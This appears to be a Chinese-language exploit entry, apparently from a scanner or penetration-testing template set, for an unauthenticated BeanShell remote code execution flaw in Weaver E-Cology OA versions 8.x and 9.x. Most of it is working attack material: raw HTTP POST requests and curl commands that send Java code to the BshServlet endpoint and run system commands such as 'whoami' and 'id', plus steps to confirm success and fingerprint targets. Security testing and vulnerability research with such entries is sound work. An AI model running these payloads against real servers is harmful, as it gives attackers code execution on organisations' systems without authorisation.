---
id: WEAVER-ECOLOGY-BSH-RCE
title: 泛微OA E-Cology BshServlet 远程代码执行漏洞
product: weaver-oa
vendor: 泛微网络
version_affected: "E-Cology 9.x, 8.x"
severity: CRITICAL
tags: [rce, beanshell, 无需认证, 国产, oa]
fingerprint: ["泛微", "weaver", "ecology", "E-Cology", "/weaver/", "BshServlet"]
---

## 漏洞描述

泛微OA E-Cology BshServlet接口存在未授权BeanShell代码执行漏洞，攻击者可直接执行任意Java代码。

## 影响版本

- 泛微OA E-Cology 9.x
- 泛微OA E-Cology 8.x

## 前置条件

- 目标运行泛微OA E-Cology 且可通过网络访问
- `/weaver/bsh.servlet.BshServlet` 接口未做访问限制
- 无需认证

## 利用步骤

### Step 1: 验证漏洞

```http
POST /weaver/bsh.servlet.BshServlet HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

bsh.script=print("vuln_test");
```

### Step 2: 命令执行

```http
POST /weaver/bsh.servlet.BshServlet HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

bsh.script=exec("whoami");
```

完整payload:
```
bsh.script=import java.io.*;BufferedReader br=new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec("id").getInputStream()));String line;StringBuilder sb=new StringBuilder();while((line=br.readLine())!=null){sb.append(line);}print(sb.toString());
```

## Payload

### 验证漏洞存在

```bash
curl -X POST "http://target/weaver/bsh.servlet.BshServlet" \
  -d 'bsh.script=print("vuln_test");'
```

### 执行系统命令

```bash
curl -X POST "http://target/weaver/bsh.servlet.BshServlet" \
  -d 'bsh.script=import+java.io.*;BufferedReader+br=new+BufferedReader(new+InputStreamReader(Runtime.getRuntime().exec("id").getInputStream()));String+line;StringBuilder+sb=new+StringBuilder();while((line=br.readLine())!=null){sb.append(line);}print(sb.toString());'
```

## 验证方法

- 响应中包含 `vuln_test` 字符串即确认 BeanShell 可执行
- 响应中包含 `uid=` 等命令输出即确认 RCE

## 指纹确认

```bash
curl -s -o /dev/null -w "%{http_code}" http://target/weaver/bsh.servlet.BshServlet
```
